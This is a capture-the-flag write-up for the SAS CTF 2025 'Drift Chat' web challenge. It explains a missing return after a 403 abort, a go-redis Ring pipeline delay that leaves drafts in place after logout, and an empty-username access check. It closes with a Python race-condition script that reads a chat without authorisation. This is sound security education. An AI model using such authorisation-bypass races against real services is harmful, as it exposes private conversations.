---
title: "Drift Chat - SAS CTF 2025 Quals"
category: "web"
subcategory: "race"
type: "writeup"
tags: ["web", "redis", "race-condition", "sprintf", "exec", "race", "sas-ctf-2025-quals", "2025", "ctf-writeup"]
summary: "Let's examine the possible application routes."
source:
  name: "CTFtime writeup #40260"
  url: "https://ctftime.org/writeup/40260"
ctf:
  name: "SAS CTF 2025 Quals"
  year: 2025
  challenge: "Drift Chat"
---

## Metadata

- **CTF:** SAS CTF 2025 Quals
- **Task:** Drift Chat
- **Author team:** LCD
- **CTFtime tags:** web, redis, race-condition
- **CTFtime:** <https://ctftime.org/writeup/40260>

---
## Drift Chat the Easy Way

Let's examine the possible application routes.

```go  
func (s *Service) routes() {  
eng := gin.Default()  
eng.Use(CORSMiddleware())  
eng.Use(ginBodyLogMiddleware)

routes := eng.Group("/api")

[routes.POST](http://routes.POST)("/register", s.Register)  
[routes.POST](http://routes.POST)("/login", s.Login)  
[routes.POST](http://routes.POST)("/logout", s.Logout)

[routes.POST](http://routes.POST)("/chat/create", s.Create)  
routes.GET("/chat/list", s.List)  
[routes.POST](http://routes.POST)("/chat/get_drafts", s.GetDrafts)  
[routes.POST](http://routes.POST)("/chat/get", s.GetChat)

[routes.POST](http://routes.POST)("/send_message", s.SendMessage)  
[routes.POST](http://routes.POST)("/set_draft", s.SetDraft)

s.eng = eng  
}  
```

During the inspection of `[routes.POST](http://routes.POST)("/chat/get", s.GetChat)`, I placed the `check_is_allowed` function inside a common field to make the code easier to read.

```go  
func (s *Service) GetChat(c *gin.Context) {  
ctx := c.Request.Context()  
// Get the 'chat' field from the JSON body of the POST request  
req := getChatReq{}  
if err := c.BindJSON(&req;; err != nil {  
slog.Error("bind", err)  
c.AbortWithStatus(403)  
return  
}  
// Get the value of the Cookie header  
tok := c.Request.CookiesNamed(tokenCookie)  
if len(tok) != 1 {  
c.AbortWithStatus(403)  
return  
}  
// Extract the first value and cookie content from the []*Cookie structure  
token := tok[0].Value  
slog.Error("Retrieved token", "token", token) // 53d4e33fef16acd582600a120e6ffeb4  
// Query redis-ring to get the username corresponding to this cookie  
st := s.red.Get(ctx, fmt.Sprintf(redis.SessionUsername, token))  
slog.Error("Retrieved token from Redis", "token redis", st) // get 53d4e33fef16acd582600a120e6ffeb4/username: testtest

if st.Err() != nil {  
c.AbortWithStatus(403)  
c.Error(st.Err())  
return  
}  
// Get the username value from *redis.StringCmd  
username := st.Val()  
slog.Error("Username", "username", username) // testtest  
ok, _ := s.check_is_allowed(ctx, username, req.Chat)

func (s *Service) check_is_allowed(ctx context.Context, name, chat string) (bool, error) {  
if name == "" {  
return true, errors.New("no name")  
}  
// Get the Chat struct containing chat name and AllowedUsers  
ch, err := s.chat.GetChat(ctx, chat)  
if err != nil {  
return false, err  
}  
slog.Error("check_is_allowed", "ch.AllowedUsers", ch.AllowedUsers, "name", name) //[kek admin]" name=testtest  
return slices.Contains(ch.AllowedUsers, name), nil  
}

// Clearly, our user is not in the chat's AllowedUsers, yet after setting the response status, the code does not stop execution.  
if !ok {  
c.AbortWithStatus(403)/  
// !!!! no return  
}  
...  
// The server responds with the chat's content  
c.JSON(200, getChatResp{Messages: messages, Users: userStatus})  
```  
![](<https://i.ibb.co/99TZXF0K/image.png>)  
## Drift Chat the Hard Way

### Old Redis Client??

When analyzing the service, we open `main.go` and see something strange in the code.

```go  
redis := red.NewRing(&red.RingOptions{  
Addrs: map[string]string{  
"redis1": "redis1:6379",  
"redis2": "redis2:6379",  
},  
})  
```

Why would the authors use two Redis instances simultaneously to store application data (obviously, this CTF task is not a high-load service)?

In `go.mod`, we see the following entries:

```go.mod  
require (  
[github.com/gin-gonic/gin](https://github.com/gin-gonic/gin) v1.10.0  
[github.com/redis/go-redis/v9](https://github.com/redis/go-redis/v9) v9.7.3  
)  
```

When visiting the repository <https://github.com/redis/go-redis>, we notice that the version of go-redis being used is not the latest. `v9.7.3 is used instead of v9.9.0`.

![](<https://i.ibb.co/jvcz62MR/image.png>)

Searching for issues with the word "ring," we come across the following issue:

<https://github.com/redis/go-redis/issues/3009>

The user claims that when using code like this:

```  
p := redisClient.Pipeline()  
p.Set(ctx, key1, value1, ttl)  
p.Set(ctxm key2, value2, ttl)  
.  
.  
.  
p.Exec(ctx)  
```

> Everything compiles and runs fine (no errors), but we are getting very inconsistent results in our shards. There seems to be a big delay from when the `p.Exec(ctx)` is called until the data shows in the shards. Even more worrisome, sometimes the data _never_ shows up. ?

### Suspicious Draft Functionality

For some reason, the application implements functionality for creating drafts and displaying user statuses in chats. This functionality was not used when placing the flag and doesn't seem very necessary. Could the problem be there?

### Old Redis Client?? + Suspicious Draft Functionality

Redis Ring + Pipeline is also used in our application, specifically in the `/api/set_draft` route.

```go  
pipe := s.red.TxPipeline()  
pipe.SAdd(ctx, fmt.Sprintf(redis.ChatWriteList, req.Chat), token)  
pipe.Set(ctx, fmt.Sprintf(redis.DraftMessage, token), req.Draft, 0)  
pipe.Set(ctx, fmt.Sprintf(redis.WrittenNow, token), req.Chat, 0)  
_, err := pipe.Exec(ctx)  
if err != nil {  
c.AbortWithStatus(500)  
c.Error(err)  
return  
}  
```

Thanks to this code, we understand that information about a user's draft may be written to Redis with a delay. How this can be applied is unclear for now.

We essentially understand that we can trigger the following behavior: a user may already be deleted, but their draft will persist.

![](<https://i.ibb.co/3mmPN0M3/image.png>)

### Vulnerability Finding

We need to read messages from the chat. It can be noticed that the function `s.chat.GetMessages` is called via the API routes `chat/get` and `send_message`.

While nothing suspicious is visible in `s.GetChat`, there are suspicious fragments in `s.SendMessage`.

#### Send Message Logic

```go  
func (s *Service) SendMessage(c *gin.Context) {

...  
st := s.red.Get(ctx, fmt.Sprintf(redis.SessionUsername, token))  
username := st.Val()

st = s.red.Get(ctx, fmt.Sprintf(redis.DraftMessage, token))  
if st.Err() != nil {  
c.AbortWithStatus(500)  
c.Error(fmt.Errorf("no draft message %s", st.Err()))  
return  
}  
msg := st.Val()

st = s.red.Get(ctx, fmt.Sprintf(redis.WrittenNow, token))  
if st.Err() != nil {  
c.AbortWithStatus(500)  
c.Error(fmt.Errorf("no written now %s", st.Err()))  
return  
}  
writtenNow := st.Val()

...

ok, _ := s.check_is_allowed(ctx, username, req.Chat)  
if !ok {  
c.AbortWithStatus(403)  
}  
  
...  
```

According to the service's logic, a message can only be sent to a chat if the user has a draft.

And if the username is included in the list of allowed users or is empty.

```go  
func (s *Service) check_is_allowed(ctx context.Context, name, chat string) (bool, error) {  
// If the username is empty, return true  
if name == "" {  
return true, errors.New("no name")  
}

ch, err := s.chat.GetChat(ctx, chat)  
if err != nil {  
return false, err  
}  
// The username is included in the list of allowed users  
return slices.Contains(ch.AllowedUsers, name), nil  
```

#### Set Draft Logic

On the other hand, `/api/set_draft` does not require authorization. The only check can be bypassed by any authorized user.

```go  
if username == "" {  
c.AbortWithStatus(403)  
return  
}  
```

## Exploit

Using the delay in command execution in `set_draft`, we bypass data deletion during logout. Thanks to the allowed empty username during access checks, we obtain the chat's contents.

![](<https://i.ibb.co/TxdSzLQY/image.png>)

```python  
import requests as r  
import random  
import string  
import multiprocessing as mp

s = r.Session()  
s.verify = False   
proxies = {  
"http": "127.0.0.1:8080",   
"https": "127.0.0.1:8080"  
}

def rand_str(N=12):   
return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

USERNAME = rand_str()  
HOST = "http://127.0.0.1"   
CHAT = "best chat eva"  
PASSWORD = "12345678"

def register(s=s):  
return [s.post](http://s.post)(f"{HOST}/api/register", proxies=proxies, json={  
"login": USERNAME,  
"password": PASSWORD  
})

def login(s=s):  
return [s.post](http://s.post)(f"{HOST}/api/login", proxies=proxies, json={  
"login": USERNAME,  
"password": PASSWORD  
})

def set_draft(s=s):  
return [s.post](http://s.post)(f"{HOST}/api/set_draft", proxies=proxies, json={  
"chat": CHAT,  
"draft": PASSWORD  
})

def logout(s=s):  
return [s.post](http://s.post)(f"{HOST}/api/logout", proxies=proxies,json={})

def send_message(s=s):  
res = [s.post](http://s.post)(f"{HOST}/api/send_message", proxies=proxies, json={  
"chat": CHAT,  
"draft": PASSWORD  
})  
return res.text

def w(f):  
f()

if __name__ == "__main__":  
register()  
login()

with mp.Pool(2) as pool:  
pool.map(w, [set_draft, logout])  
print(send_message())  
```

![](<https://i.ibb.co/nMrWcGkr/image.png>)
